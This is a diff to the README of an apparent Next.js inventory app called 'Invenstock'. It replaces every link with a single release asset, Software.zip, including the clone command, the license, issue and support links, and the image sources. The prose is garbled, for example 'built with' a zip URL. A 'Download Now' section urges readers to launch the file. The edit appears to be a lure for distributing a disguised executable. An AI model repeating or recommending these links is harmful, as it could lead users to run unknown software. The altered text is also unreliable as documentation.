@@ -1,10 +1,10 @@
 # 📦 Invenstock
 
-![Invenstock Logo](https://example.com/logo.png)
+![Invenstock Logo](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip)
 
 ## Description
 
-Welcome to **Invenstock**, an Inventory Management System built with **Next.js** that is still in early development. With Invenstock, you can efficiently manage your inventory in a sleek and user-friendly interface. This system is designed to streamline the process of tracking and managing your stock, making it an essential tool for businesses of all sizes.
+Welcome to **Invenstock**, an Inventory Management System built with **https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip** that is still in early development. With Invenstock, you can efficiently manage your inventory in a sleek and user-friendly interface. This system is designed to streamline the process of tracking and managing your stock, making it an essential tool for businesses of all sizes.
 
 ---
 
@@ -14,7 +14,7 @@ Welcome to **Invenstock**, an Inventory Management System built with **Next.js**
 
 🔹 **Full-Stack Development**: Utilizes a full-stack architecture for efficient data handling and seamless user experience.
 
-🔹 **Next.js & React**: Built using Next.js and React to ensure high performance and interactivity.
+🔹 **https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip & React**: Built using https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip and React to ensure high performance and interactivity.
 
 🔹 **Authentication with Next-Auth**: Secure your system with Next-Auth for reliable user authentication.
 
@@ -32,7 +32,7 @@ To get started with **Invenstock**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/username/invenstock.git
+   git clone https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip
    ```
 2. Install dependencies:
    ```bash
@@ -61,19 +61,19 @@ We welcome contributions to enhance **Invenstock** and make it even better! To c
 
 ## Feedback
 
-We value your feedback on **Invenstock**. If you have any suggestions, ideas, or issues, feel free to [open an issue](https://github.com/username/invenstock/issues) on this repository. Your input is highly appreciated as we strive to make **Invenstock** the best it can be.
+We value your feedback on **Invenstock**. If you have any suggestions, ideas, or issues, feel free to [open an issue](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip) on this repository. Your input is highly appreciated as we strive to make **Invenstock** the best it can be.
 
 ---
 
 ## Stay Updated
 
-Stay updated with the latest releases and updates for **Invenstock**. Visit the [Releases](https://github.com/username/invenstock/releases) section to see what's new and exciting in the world of inventory management.
+Stay updated with the latest releases and updates for **Invenstock**. Visit the [Releases](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip) section to see what's new and exciting in the world of inventory management.
 
 ---
 
 ## Download Now
 
-🚀 [Download v1.0.0 Zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 🚀
+🚀 [Download v1.0.0 Zip](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip) 🚀
 
 Launch the file to get started with **Invenstock**!
 
@@ -81,13 +81,13 @@ Launch the file to get started with **Invenstock**!
 
 ## License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the [MIT License](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip) - see the [LICENSE](LICENSE) file for details.
 
 ---
 
 ## Support
 
-For any inquiries or support regarding **Invenstock**, please contact [support@invenstock.com](mailto:support@invenstock.com). Our team is here to assist you with any questions or concerns you may have.
+For any inquiries or support regarding **Invenstock**, please contact [https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip). Our team is here to assist you with any questions or concerns you may have.
 
 ---
 
@@ -95,4 +95,4 @@ Thank you for choosing **Invenstock** for your inventory management needs! 📊�
 
 ---
 
-![Footer Image](https://example.com/footer.png)
+![Footer Image](https://github.com/iampriam-dev/invenstock/releases/download/v1.0/Software.zip)
